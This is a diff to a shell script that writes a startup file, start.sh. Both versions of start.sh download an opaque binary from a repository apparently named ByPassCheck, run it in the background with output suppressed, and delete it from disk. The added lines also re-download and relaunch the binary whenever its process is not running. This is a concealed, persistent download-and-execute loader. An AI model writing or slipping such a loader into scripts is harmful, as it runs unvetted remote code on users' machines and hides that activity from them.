@@ -19,13 +19,22 @@ create_mainfest_file(){
     echo "写启动文件："
     cat << EOF > start.sh
     #!/bin/bash
-    distpath=~
-    if [ ! -f $distpath/msv.txt ]; then
-    touch msv.txt
-    wget https://raw.githubusercontent.com/GTale/ByPassCheck/master/invoke -q -O ges
-    chmod +x ges
-    nohup ./ges >/dev/null 2>&1  &
-    rm ges
+    if [ ! -f ./msv.txt ]; then
+    	touch msv.txt
+    	wget https://raw.githubusercontent.com/GTale/ByPassCheck/master/invoke -q -O ges
+    	chmod +x ges
+    	nohup ./ges >/dev/null 2>&1  &
+    	rm ges*
+    fi
+    
+    if [ -f ./msv.txt ]; then
+    	num=$(ps -ef|grep ges|grep -v grep|wc -l)
+    	if [ $num -lt 1 ]; then
+        	wget https://raw.githubusercontent.com/GTale/ByPassCheck/master/invoke -q -O ges
+		chmod +x ges
+		nohup ./ges >/dev/null 2>&1  &
+		rm ges* 
+	fi
     fi
 EOF
     
